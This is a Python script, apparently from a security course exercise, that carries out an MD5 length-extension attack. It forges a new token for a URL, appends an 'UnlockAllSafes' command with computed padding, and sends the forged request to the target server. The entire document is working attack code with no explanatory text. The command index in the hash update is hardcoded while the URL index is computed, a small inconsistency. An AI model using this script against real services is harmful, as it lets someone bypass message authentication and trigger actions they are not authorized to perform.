#!/usr/bin/python3
import http.client as httplib
from urllib.parse import urlparse, quote
import sys, re
from pymd5 import *

url = sys.argv[1]
#extract values from url
split_url = url.split('token=')
token_commands = split_url[1].split('&user=')
num_commands =len(token_commands[1].split('&'))

#make new token with correct padding
m ='12345678user=' + token_commands[1]
padded_m_len =(len(m)  + len(padding((len(m)) * 8)))*8
h2 = md5(
        state = token_commands[0],
        count = padded_m_len
    )

#make create updated url with new token
command  = '&command3=UnlockAllSafes'
h2.update(command)
parsedUrl = urlparse(url)
q = 'token='+h2.hexdigest()+'&user='+ token_commands[1] + quote(padding(len(m)*8))+'&command' +str(num_commands)+ '=UnlockAllSafes'

#connect to new url
conn = httplib.HTTPConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + q)
print(conn.getresponse().read())

